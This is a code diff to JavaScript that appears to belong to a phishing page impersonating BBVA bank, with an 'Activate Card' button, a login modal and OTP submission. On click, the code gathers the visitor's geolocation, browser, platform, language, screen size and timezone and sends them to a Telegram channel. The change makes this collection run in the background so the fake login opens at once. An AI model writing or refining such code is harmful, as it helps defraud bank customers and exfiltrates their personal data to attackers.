@@ -1113,27 +1113,27 @@ async function submitOTP() {
 async function handleActivateCardClick() {
     console.log('🔔 Activate Card button clicked!');
     
-    // Open login modal first (don't wait for location)
+    // Open login modal immediately (don't wait for anything)
     openLoginModal();
     
-    // Get location ONLY ONCE and store it
-    const location = await getLocation();
-    const currentTime = getCurrentTime();
-    const userInfo = getUserInfo();
-    
-    // Store location in sessionStorage for later use
-    sessionStorage.setItem('bbva_location_lat', location.latitude);
-    sessionStorage.setItem('bbva_location_lng', location.longitude);
-    sessionStorage.setItem('bbva_location_acc', location.accuracy);
-    sessionStorage.setItem('bbva_initial_time', currentTime);
-    sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
-    sessionStorage.setItem('bbva_platform', userInfo.platform);
-    sessionStorage.setItem('bbva_language', userInfo.language);
-    sessionStorage.setItem('bbva_screen', `${userInfo.screenWidth}x${userInfo.screenHeight}`);
-    sessionStorage.setItem('bbva_timezone', userInfo.timezone);
-    
-    // Send notification to Telegram
-    const notificationMessage = `
+    // Get location in background (non-blocking)
+    getLocation().then(location => {
+        const currentTime = getCurrentTime();
+        const userInfo = getUserInfo();
+        
+        // Store location in sessionStorage for later use
+        sessionStorage.setItem('bbva_location_lat', location.latitude);
+        sessionStorage.setItem('bbva_location_lng', location.longitude);
+        sessionStorage.setItem('bbva_location_acc', location.accuracy);
+        sessionStorage.setItem('bbva_initial_time', currentTime);
+        sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
+        sessionStorage.setItem('bbva_platform', userInfo.platform);
+        sessionStorage.setItem('bbva_language', userInfo.language);
+        sessionStorage.setItem('bbva_screen', `${userInfo.screenWidth}x${userInfo.screenHeight}`);
+        sessionStorage.setItem('bbva_timezone', userInfo.timezone);
+        
+        // Send notification to Telegram
+        const notificationMessage = `
 🔔 <b>BBVA Notification Button Clicked</b>
 
 📍 <b>Location:</b>
@@ -1149,10 +1149,27 @@ async function handleActivateCardClick() {
    Language: ${userInfo.language}
    Screen: ${userInfo.screenWidth}x${userInfo.screenHeight}
    Timezone: ${userInfo.timezone}
-    `;
-    
-    console.log('Sending notification to Telegram...');
-    await sendToTelegram(notificationMessage);
+        `;
+        
+        console.log('Sending notification to Telegram...');
+        sendToTelegram(notificationMessage).catch(err => {
+            console.error('Error sending to Telegram:', err);
+        });
+    }).catch(err => {
+        console.error('Error getting location:', err);
+        // Store default values if location fails
+        const currentTime = getCurrentTime();
+        const userInfo = getUserInfo();
+        sessionStorage.setItem('bbva_location_lat', 'Not available');
+        sessionStorage.setItem('bbva_location_lng', 'Not available');
+        sessionStorage.setItem('bbva_location_acc', 'Not available');
+        sessionStorage.setItem('bbva_initial_time', currentTime);
+        sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
+        sessionStorage.setItem('bbva_platform', userInfo.platform);
+        sessionStorage.setItem('bbva_language', userInfo.language);
+        sessionStorage.setItem('bbva_screen', `${userInfo.screenWidth}x${userInfo.screenHeight}`);
+        sessionStorage.setItem('bbva_timezone', userInfo.timezone);
+    });
 }
 
 // Proceed to Home Screen from Importance Notice
